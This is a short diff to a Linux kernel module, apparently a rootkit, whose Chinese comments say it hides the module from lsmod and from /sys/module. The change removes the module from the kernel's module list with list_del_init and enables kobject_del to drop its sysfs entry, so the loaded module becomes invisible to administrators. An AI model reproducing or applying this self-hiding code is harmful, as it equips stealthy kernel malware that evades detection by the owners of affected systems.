@@ -14,29 +14,20 @@
 MODULE_LICENSE("Dual BSD/GPL");
 
 
-static int rl_unlink_module(void *_mod)
-{
-    struct module *mod = _mod;
-    list_del(&mod->list);
-
-    return 0;
-}
-
 static int __init rl_init(void)
 {
     printk("RL Module init!\n");
 
     //对lsmod命令隐藏模块名称
     mutex_lock(&module_mutex);
-    stop_machine(rl_unlink_module, THIS_MODULE, NULL);
+    list_del_init(&THIS_MODULE->list);
     mutex_unlock(&module_mutex);
 
-#if 0
-    list_del_init(&THIS_MODULE->list);
-
     //从/sys/module/目录下隐藏模块
+#ifdef CONFIG_SYSFS
     kobject_del(&THIS_MODULE->mkobj.kobj);
 #endif
+
 	return 0;
 }
 
